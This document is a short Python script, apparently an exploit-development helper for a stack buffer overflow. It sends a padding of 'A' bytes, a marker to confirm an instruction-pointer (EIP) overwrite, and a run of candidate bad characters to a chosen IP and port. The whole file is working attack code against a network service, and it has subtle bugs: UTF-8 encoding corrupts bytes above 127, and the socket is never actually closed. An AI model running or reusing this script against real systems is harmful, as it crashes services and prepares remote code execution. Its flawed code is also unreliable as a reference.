#!/usr/bin/python3

import socket
import argparse

def gen_badchars(known):
    byte_array = ""
    for i in range(1,256):
        char = chr(i)
        if char not in known:
            byte_array += char
    return bytes(byte_array, "utf8")


args = argparse.ArgumentParser()
args.add_argument("ip", help="The IP to send byte array to.")
args.add_argument("port", help="The port to send pattern to.", type=int)
args.add_argument("offset", help="Offset of Instruction Pointer", type=int)
args.add_argument("-b", help='Known bad chars. eg "\x00\x12\xca"')
args = args.parse_args()

known = args.b if args.b else ""
payload = (b"A" * args.offset) + b"DCBA" + gen_badchars(known) # confirm EIP overwrite

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((args.ip, args.port))
    print(sock.recv(1024).decode())
    print(f"Sending byte array.")
    sock.send(payload)
    print(sock.recv(1024))
    sock.close
except Exception as error:
    print("It's dead Jim!")
    print(error)